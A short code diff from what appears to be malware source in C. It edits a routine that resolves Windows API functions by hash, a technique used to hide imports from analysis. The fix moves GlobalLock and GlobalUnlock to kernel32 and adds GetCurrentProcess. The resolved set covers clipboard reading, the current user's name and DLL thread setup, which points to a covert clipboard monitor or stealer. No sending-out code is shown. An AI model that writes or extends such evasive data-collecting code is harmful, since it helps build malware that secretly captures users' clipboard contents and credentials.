@@ -133,14 +133,15 @@ DYNAMIC_APIS * InitDynamicAPIs(void) {
     RESOLVE(hKernel32, fnSleep, pSleep, HASH_Sleep);
     RESOLVE(hKernel32, fnWaitForSingleObject, pWaitForSingleObject, HASH_WaitForSingleObject);
     RESOLVE(hKernel32, fnDisableThreadLibraryCalls, pDisableThreadLibraryCalls, HASH_DisableThreadLibraryCalls);
+    RESOLVE(hKernel32, fnGlobalLock, pGlobalLock, HASH_GlobalLock);
+    RESOLVE(hKernel32, fnGlobalUnlock, pGlobalUnlock, HASH_GlobalUnlock);
+    RESOLVE(hKernel32, fnGetCurrentProcess, pGetCurrentProcess, HASH_GetCurrentProcess);
 
     /* USER32 */
     RESOLVE(hUser32, fnGetClipboardSequenceNumber, pGetClipboardSequenceNumber, HASH_GetClipboardSequenceNumber);
     RESOLVE(hUser32, fnOpenClipboard, pOpenClipboard, HASH_OpenClipboard);
     RESOLVE(hUser32, fnGetClipboardData, pGetClipboardData, HASH_GetClipboardData);
     RESOLVE(hUser32, fnCloseClipboard, pCloseClipboard, HASH_CloseClipboard);
-    RESOLVE(hUser32, fnGlobalLock, pGlobalLock, HASH_GlobalLock);
-    RESOLVE(hUser32, fnGlobalUnlock, pGlobalUnlock, HASH_GlobalUnlock);
 
     /* ADVAPI32 */
     RESOLVE(hAdvapi32, fnGetUserNameA, pGetUserNameA, HASH_GetUserNameA);
